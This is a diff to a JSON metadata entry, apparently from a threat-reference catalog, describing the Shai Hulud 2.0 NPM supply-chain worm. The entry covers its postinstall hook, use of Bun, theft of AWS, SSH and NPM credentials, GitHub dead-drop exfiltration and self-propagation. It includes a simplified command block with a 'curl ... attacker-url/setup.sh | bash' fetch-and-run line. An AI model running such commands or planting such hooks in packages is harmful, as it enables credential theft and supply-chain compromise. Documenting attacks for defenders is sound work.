@@ -23,7 +23,12 @@
   "metadata": {
     "descriptionHtml": "<p><span style='color:#ef4444;font-weight:bold;'>Shai Hulud 2.0</span> is an advanced NPM supply chain attack that functions as a worm. It distinguishes itself by installing and using the <span style='color:#ef4444;font-weight:bold;'>Bun runtime</span> to execute malicious JavaScript, likely to evade detections tuned for Node.js.</p><ol><li>Attacker publishes a malicious package to the NPM registry.</li><li>When a victim runs <span style='color:#ef4444;font-weight:bold;'>npm install</span>, a <strong>postinstall hook</strong> triggers.</li><li>The script detects or installs the <strong>Bun runtime</strong>.</li><li>It executes the payload using Bun, harvesting sensitive files (AWS keys, SSH keys, NPM tokens).</li><li>Data is exfiltrated to an attacker-controlled <strong>GitHub repository</strong> (using it as C2/Dead Drop).</li><li>The malware uses stolen NPM tokens to publish further malicious packages, propagating the worm.</li></ol>",
     "commandsBlock": "# Step 1: Attacker publishes the initial carrier package\n$ npm publish @malicious/shai-hulud\n\n# Step 2: Victim executes installation\n$ npm install @malicious/shai-hulud\n\n# Step 3: Malicious postinstall hook triggers (simplified)\n$ curl -sL http://attacker-url/setup.sh | bash\n\n# Step 4: Malware uses Bun to run payload\n$ ~/.bun/bin/bun run payload.js\n\n# Step 5: Exfiltration to GitHub\n$ git push origin main",
-    "toolSource": "NPM Registry (Malicious Package), GitHub (C2 Infrastructure)",
+    "extraInfo": [
+      "NPM Registry - Attack leverages official npm publishing flow",
+      "GitHub Dead Drop - Exfiltration via git push to attacker repo",
+      "Bun Runtime - https://bun.sh - Used to evade Node.js detections",
+      "MITRE T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain"
+    ],
     "prerequisites": [
       "Victim must install the compromised/typosquatted package",
       "Outbound network access to GitHub and NPM",
